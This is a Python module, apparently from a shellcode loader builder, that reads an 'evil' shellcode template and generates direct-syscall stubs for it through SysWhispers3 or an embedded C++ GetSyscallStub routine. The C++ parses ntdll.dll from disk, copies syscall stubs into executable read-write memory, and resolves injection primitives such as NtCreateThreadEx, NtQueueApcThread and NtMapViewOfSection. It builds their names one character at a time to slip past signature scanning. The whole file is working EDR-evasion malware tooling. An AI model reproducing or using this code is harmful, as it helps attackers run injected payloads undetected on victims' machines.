from core.config.config import Config
from core.engines.SysCallsComponent import SysCallsComponent
from core.engines.CallComponent import CallComponent
from core.engines.CodeComponent import CodeComponent
from core.engines.IncludeComponent import IncludeComponent
from core.engines.DefineComponent import DefineComponent
from core.controlers.Module import Module
import shutil
import os
import re
from enum import Enum
from colorama import init, Fore


debug_mode = Config().get("DEBUG", "SYSCALLS")

class SysCallsControler:
    def __init__(self,evil_sc_template_file,sysCallsType,hashSyscalls,recovery="jumper_randomized"):
        self.evil_sc_template_file = evil_sc_template_file
        self.sysCallsType = sysCallsType
        self.hashSyscalls = hashSyscalls
        self.recovery = recovery
        self.sw_header_basename = ""
        #Load Config
        self.headers_folder = Config().get("FOLDERS", "HEADERS")
        self.loader_folder = Config().get("FOLDERS", "LOADER_TEMPLATE")

        #Load all Nt* functions of the template
        self.nt_functions = self.get_template_nt_functions()

        #Generate Syscall module + files if template support it
        self.sysModule = self.compute_syscall_module() if len(self.nt_functions) > 0 else Module()

        #Debug
        if debug_mode == "True":
            print(vars(self))
            print()

    def copy_sycall_header_file(self,src_header):
        src_file = f"{self.headers_folder}/{src_header}"
        dest_file = f"{self.loader_folder}/winhelper.h"
        try:
            if not os.path.isfile(src_file):
                raise FileNotFoundError(f"The source file {src_file} does not exist.")

            dest_folder = os.path.dirname(dest_file)
            if not os.path.isdir(dest_folder):
                os.makedirs(dest_folder)
            
            # Copy the source file to the destination
            shutil.copy2(src_file, dest_file)
            #print(f"File {src_file} copied to {dest_file}.")
        
        except Exception as e:
            print(f"Error: {e}")

    def compute_syscall_module(self):
        module = None
        if self.sysCallsType == "":
            module = self.get_noSysCall_module()

        elif self.sysCallsType == "GetSyscallStub":
            print("Calling get_GetSyscallStub_module")
            module = self.get_GetSyscallStub_module()

        elif self.sysCallsType == "SysWhispers3":
            print("Calling get_SysWhispers3_module")            
            ### Import and generate SW3 files
            from core.syscalls.SysWhispers3.syswhispers import SysWhispers
            from core.syscalls.SysWhispers3.syswhispers import SyscallRecoveryType

            sw3_basename = f"{self.headers_folder}/SW3Syscalls"
            sw3_recovery_type = SyscallRecoveryType.from_name_or_default(self.recovery)

            syswhispers_module =  SysWhispers(compiler="mingw", arch="x64", recovery=sw3_recovery_type)
            syswhispers_module.generate(function_names=self.nt_functions, basename=sw3_basename)
            
            self.fix_sw3_header(sw3_basename) # Fix SW3 generated files for compilation


            #Copy SW3 headers to build folder
            self.copy_sycall_header_file("SW3Syscalls.h")
            module = self.get_SysWhispers3_module() #Get_module
        return module

    def hashSyscalls(self):
        pass

    def get_template_nt_functions(self):
        with open(self.evil_sc_template_file, 'r') as file:
            code = file.read()

        # Find all unique Nt* functions
        nt_functions_pattern = r'\b(Nt\w+)\b'
        nt_functions = set(re.findall(nt_functions_pattern, code))
        
        return list(nt_functions)


    def get_syscall_module(self):
        return self.sysModule


    def get_SysWhispers3_module(self):
        module = Module()
        module.mingw_options = " -s -w -std=c++17 -masm=intel -fpermissive -static -lntdll -lpsapi -Wl,--subsystem,console"
        module.components = [
            IncludeComponent("\"winhelper.h\""),
            SysCallsComponent("")
        ]
        return module

    def get_noSysCall_module(self):
        module = Module()
        return module

    def fix_sw3_header(self, base_file_path): 
        header_file_path = base_file_path + '.h'
        source_file_path = base_file_path + '.c'
        # Step 1: Read and modify SW3.h
        with open(header_file_path, 'r') as header_file:
            header_content = header_file.read()
        header_content = header_content.replace('Sw3Nt', 'Nt') # Replace Sw3Nt with Nt in the header content
        
        # Step 2: Read and modify SW3.c
        with open(source_file_path, 'r') as source_file:
            source_content = source_file.readlines()
        print(f"removing {header_file_path}")
        source_content = [line for line in source_content if not line.startswith('#include "SW3Syscalls.h"')] # Remove the line "#include "SW3S.h"" from source_content

        # Step 3: Concatenate modified content and erase SW3.c
        combined_content = header_content + '\n' + ''.join(source_content)
        with open(header_file_path, 'w') as combined_file:
            combined_file.write(combined_content)

        # Remove SW3.c 
        os.remove(source_file_path)


    def get_GetSyscallStub_module(self):
        module = Module()
        module.mingw_options = " -s -w -std=c++17 -masm=intel -fpermissive -static -lntdll -lpsapi -Wl,--subsystem,console"
        module.components =[ 
            
            DefineComponent(r"""
            #pragma comment(lib, "ntdll")
            #ifndef UNICODE  
            typedef std::string String;
            #else
            typedef std::wstring String;
            #endif  
            typedef VOID(KNORMAL_ROUTINE) (
                IN PVOID NormalContext,
                IN PVOID SystemArgument1,
                IN PVOID SystemArgument2);

            typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;

            typedef struct _PS_ATTRIBUTE
            {
                ULONG  Attribute;
                SIZE_T Size;
                union
                {
                    ULONG Value;
                    PVOID ValuePtr;
                } u1;
                PSIZE_T ReturnLength;
            } PS_ATTRIBUTE, *PPS_ATTRIBUTE;

            typedef struct _PS_ATTRIBUTE_LIST
            {
                SIZE_T       TotalLength;
                PS_ATTRIBUTE Attributes[1];
            } PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

            int const SYSCALL_STUB_SIZE = 23;
            using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
            using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
            using myNtProtectVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
            using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
            using myNtResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
            using myNtWaitForSingleObject = NTSTATUS(NTAPI*)(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER TimeOut);
            using myNtQueryInformationProcess = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
            using myNtReadVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
            using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);
            using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
            using myNtQueueApcThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PKNORMAL_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
            using myNtAlertResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
            using myNtGetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
            using myNtSetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT Context);
            using myNtDelayExecution = NTSTATUS(NTAPI*)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
            using myNtOpenSection = NTSTATUS(NTAPI*)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
            using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
            using myNtFreeVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG FreeType);

            myNtAllocateVirtualMemory NtAllocateVirtualMemory;
            myNtWriteVirtualMemory NtWriteVirtualMemory;
            myNtProtectVirtualMemory NtProtectVirtualMemory;
            myNtCreateThreadEx NtCreateThreadEx;
            myNtResumeThread NtResumeThread;
            myNtWaitForSingleObject NewNtWaitForSingleObject;
            myNtQueryInformationProcess NewNtQueryInformationProcess;
            myNtReadVirtualMemory NtReadVirtualMemory;
            myNtClose NewNtClose;
            myNtOpenProcess NtOpenProcess;
            myNtQueueApcThread NtQueueApcThread;
            myNtAlertResumeThread NtAlertResumeThread;
            myNtGetContextThread NtGetContextThread;
            myNtSetContextThread NtSetContextThread;
            myNtDelayExecution NtDelayExecution;
            myNtOpenSection NtOpenSection;
            myNtMapViewOfSection NtMapViewOfSection;
            myNtFreeVirtualMemory NtFreeVirtualMemory;

            PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
            {
                    return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
            }

            BOOL GetSyscallStub(String functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
            {
                    PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
                    PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
                    BOOL stubFound = FALSE;

                    for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
                    {
                            DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
                            DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
                            LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
                            if (strcmp(functionNameResolved, functionName.c_str()) == 0)
                            {
                                    memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
                                    stubFound = TRUE;
                            }
                    }

                    return stubFound;
            }

        """),
        
        SysCallsComponent(r""" 
    DWORD tProcess2 = GetCurrentProcessId();
    HANDLE pHandle2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2);

    HANDLE syscallStub_NtAllocateVirtualMemory = VirtualAllocEx(pHandle2, NULL, (SIZE_T)SYSCALL_STUB_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    HANDLE syscallStub_NtWriteVirtualMemory = static_cast<char*>(syscallStub_NtAllocateVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtProtectVirtualMemory = static_cast<char*>(syscallStub_NtWriteVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtCreateThreadEx = static_cast<char*>(syscallStub_NtProtectVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtResumeThread = static_cast<char*>(syscallStub_NtCreateThreadEx) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtWaitForSingleObject = static_cast<char*>(syscallStub_NtResumeThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtQueryInformationProcess = static_cast<char*>(syscallStub_NtWaitForSingleObject) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtReadVirtualMemory = static_cast<char*>(syscallStub_NtQueryInformationProcess) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtClose = static_cast<char*>(syscallStub_NtReadVirtualMemory) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtOpenProcess = static_cast<char*>(syscallStub_NtClose) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtQueueApcThread = static_cast<char*>(syscallStub_NtOpenProcess) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtAlertResumeThread = static_cast<char*>(syscallStub_NtQueueApcThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtGetContextThread = static_cast<char*>(syscallStub_NtAlertResumeThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtSetContextThread = static_cast<char*>(syscallStub_NtGetContextThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtDelayExecution = static_cast<char*>(syscallStub_NtSetContextThread) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtOpenSection = static_cast<char*>(syscallStub_NtDelayExecution) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtMapViewOfSection = static_cast<char*>(syscallStub_NtOpenSection) + SYSCALL_STUB_SIZE;
    HANDLE syscallStub_NtFreeVirtualMemory = static_cast<char*>(syscallStub_NtMapViewOfSection) + SYSCALL_STUB_SIZE;

    DWORD oldProtection = 0;
    HANDLE file = NULL;
    DWORD fileSize = NULL;
    DWORD bytesRead = NULL;
    LPVOID fileData = NULL;

    // define NtAllocateVirtualMemory
    NtAllocateVirtualMemory = (myNtAllocateVirtualMemory)syscallStub_NtAllocateVirtualMemory;
    VirtualProtect(syscallStub_NtAllocateVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtWriteVirtualMemory
    NtWriteVirtualMemory = (myNtWriteVirtualMemory)syscallStub_NtWriteVirtualMemory;
    VirtualProtect(syscallStub_NtWriteVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtProtectVirtualMemory
    NtProtectVirtualMemory = (myNtProtectVirtualMemory)syscallStub_NtProtectVirtualMemory;
    VirtualProtect(syscallStub_NtProtectVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtCreateThreadEx
    NtCreateThreadEx = (myNtCreateThreadEx)syscallStub_NtCreateThreadEx;
    VirtualProtect(syscallStub_NtCreateThreadEx, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtResumeThread
    NtResumeThread = (myNtResumeThread)syscallStub_NtResumeThread;
    VirtualProtect(syscallStub_NtResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define myNtWaitForSingleObject
    NewNtWaitForSingleObject = (myNtWaitForSingleObject)syscallStub_NtWaitForSingleObject;
    VirtualProtect(syscallStub_NtWaitForSingleObject, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtQueryInformationProcess
    NewNtQueryInformationProcess = (myNtQueryInformationProcess)syscallStub_NtQueryInformationProcess;
    VirtualProtect(syscallStub_NtQueryInformationProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtReadVirtualMemory
    NtReadVirtualMemory = (myNtReadVirtualMemory)syscallStub_NtReadVirtualMemory;
    VirtualProtect(syscallStub_NtReadVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtClose
    NewNtClose = (myNtClose)syscallStub_NtClose;
    VirtualProtect(syscallStub_NtClose, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtOpenProcess
    NtOpenProcess = (myNtOpenProcess)syscallStub_NtOpenProcess;
    VirtualProtect(syscallStub_NtOpenProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtQueueApcThread
    NtQueueApcThread = (myNtQueueApcThread)syscallStub_NtQueueApcThread;
    VirtualProtect(syscallStub_NtQueueApcThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtAlertResumeThread
    NtAlertResumeThread = (myNtAlertResumeThread)syscallStub_NtAlertResumeThread;
    VirtualProtect(syscallStub_NtAlertResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtGetContextThread
    NtGetContextThread = (myNtGetContextThread)syscallStub_NtGetContextThread;
    VirtualProtect(syscallStub_NtGetContextThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtSetContextThread
    NtSetContextThread = (myNtSetContextThread)syscallStub_NtSetContextThread;
    VirtualProtect(syscallStub_NtSetContextThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define syscallStub_NtDelayExecution
    NtDelayExecution = (myNtDelayExecution)syscallStub_NtDelayExecution;
    VirtualProtect(syscallStub_NtDelayExecution, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtOpenSection
    NtOpenSection = (myNtOpenSection)syscallStub_NtOpenSection;
    VirtualProtect(syscallStub_NtOpenSection, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtMapViewOfSection
    NtMapViewOfSection = (myNtMapViewOfSection)syscallStub_NtMapViewOfSection;
    VirtualProtect(syscallStub_NtMapViewOfSection, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    // define NtFreeVirtualMemory
    NtFreeVirtualMemory = (myNtFreeVirtualMemory)syscallStub_NtFreeVirtualMemory;
    VirtualProtect(syscallStub_NtFreeVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);


    file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    fileSize = GetFileSize(file, NULL);
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(file, fileData, fileSize, &bytesRead, NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
    DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
    PIMAGE_SECTION_HEADER textSection = section;
    PIMAGE_SECTION_HEADER rdataSection = section;

    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
    {
            if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
                    rdataSection = section;
                    break;
            }
            section++;
    }

    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

    String scall = std::string("N") + "t" + "A" + "l" + "l" + "o" + "c" + "a" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    BOOL StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAllocateVirtualMemory);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "W" + "r" + "i" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWriteVirtualMemory);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "P" + "r" + "o" + "t" + "e" + "c" + "t" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtProtectVirtualMemory);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "C" + "r" + "e" + "a" + "t" + "e" + "T" + "h" + "r" + "e" + "a" + "d" + "E" + "x";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtCreateThreadEx);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtResumeThread);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "W" + "a" + "i" + "t" + "F" + "o" + "r" + "S" + "i" + "n" + "g" + "l" + "e" + "O" + "b" + "j" + "e" + "c" + "t";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWaitForSingleObject);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "Q" + "u" + "e" + "r" + "y" + "I" + "n" + "f" + "o" + "r" + "m" + "a" + "t" + "i" + "o" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueryInformationProcess);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "R" + "e" + "a" + "d" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtReadVirtualMemory);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "C" + "l" + "o" + "s" + "e";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtClose);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "O" + "p" + "e" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtOpenProcess);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "Q" + "u" + "e" + "u" + "e" + "A" + "p" + "c" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueueApcThread);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "A" + "l" + "e" + "r" + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAlertResumeThread);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "G" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtGetContextThread);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "S" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtSetContextThread);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "D" + "e" + "l" + "a" + "y" + "E" + "x" + "e" + "c" + "u" + "t" + "i" + "o" + "n";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtDelayExecution);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "O" + "p" + "e" + "n" + "S" + "e" + "c" + "t" + "i" + "o" + "n";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtOpenSection);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "M" + "a" + "p" + "V" + "i" + "e" + "w" + "O" + "f" + "S" + "e" + "c" + "t" + "i" + "o" + "n";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtMapViewOfSection);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
    scall = std::string("N") + "t" + "F" + "r" + "e" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtFreeVirtualMemory);
    printf("%s Stub Found: %s\n", scall.c_str(), StubFound ? "true" : "false");
        """),
        IncludeComponent("<winternl.h>")
        ]
        return module